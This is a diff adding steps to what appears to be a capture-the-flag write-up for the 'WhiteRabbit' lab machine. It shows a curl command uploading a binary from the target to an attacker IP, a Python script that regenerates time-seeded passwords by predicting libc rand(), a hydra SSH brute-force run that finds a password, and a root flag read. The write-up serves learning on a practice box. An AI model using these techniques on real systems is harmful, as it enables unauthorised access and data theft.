@@ -669,4 +669,49 @@ morpheus@whiterabbit:/opt/neo-password-generator$ cp neo-password-generator ~/ne
 curl -F "file=@neo-password-generator" http://10.10.16.43:1818/
 ```
 
+```
+from ctypes import CDLL
+import datetime
+
+
+libc = CDLL("libc.so.6")
+seconds = datetime.datetime(2024, 8, 30, 14, 40, 42, tzinfo=datetime.timezone(datetime.timedelta(0))).timestamp()
+
+for i in range(0,1000):
+    password = ""
+    microseconds = i
+    current_seed_value = int(seconds * 1000 + microseconds)
+    libc.srand(current_seed_value)
+
+    for j in range(0,20):
+        rand_int = libc.rand()
+        password += "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"[ rand_int % 62]
+    
+    print(password)
+```
+
+```
+(lab-env) Hexada@hexada ~/pentest-env/vrm/white.rabbit.htb/dev/shm$ python3 generator.py > password.txt  
+```
+
+```
+(lab-env) Hexada@hexada ~/pentest-env/vrm/white.rabbit.htb/dev/shm$ hydra -l neo -P password.txt ssh://whiterabbit.htb -t 20                  
+Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-08-25 14:26:51
+[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
+[DATA] max 20 tasks per 1 server, overall 20 tasks, 1000 login tries (l:1/p:1000), ~50 tries per task
+[DATA] attacking ssh://whiterabbit.htb:22/
+[22][ssh] host: whiterabbit.htb   login: neo   password: WBSxhWgfnMiclr*****
+1 of 1 target successfully completed, 1 valid password found
+[WARNING] Writing restore file because 5 final worker threads did not complete until end.
+[ERROR] 5 targets did not resolve or could not be connected
+[ERROR] 0 target did not complete
+Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-08-25 14:26:59
+```
+
+```
+neo@whiterabbit:/home$ sudo cat /root/root.txt
+e93d2b99d9f51ae8eb68af******
+```
 
